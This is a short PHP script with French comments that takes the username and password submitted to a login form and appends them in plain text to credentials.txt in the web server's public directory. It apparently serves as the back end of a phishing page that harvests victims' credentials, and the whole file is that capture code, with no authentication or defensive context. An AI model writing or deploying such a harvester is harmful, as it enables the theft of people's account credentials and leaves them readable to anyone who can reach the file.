<?php
// Vérifier si le formulaire a été soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les identifiants
    $username = isset($_POST['username']) ? trim($_POST['username']) : "NON RENSEIGNÉ";
    $password = isset($_POST['password']) ? trim($_POST['password']) : "NON RENSEIGNÉ";

    // Enregistrement dans le fichier
    $file = "/var/www/html/credentials.txt";
    $data = "Utilisateur: $username | Mot de passe: $password\n";
    
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
}
?>
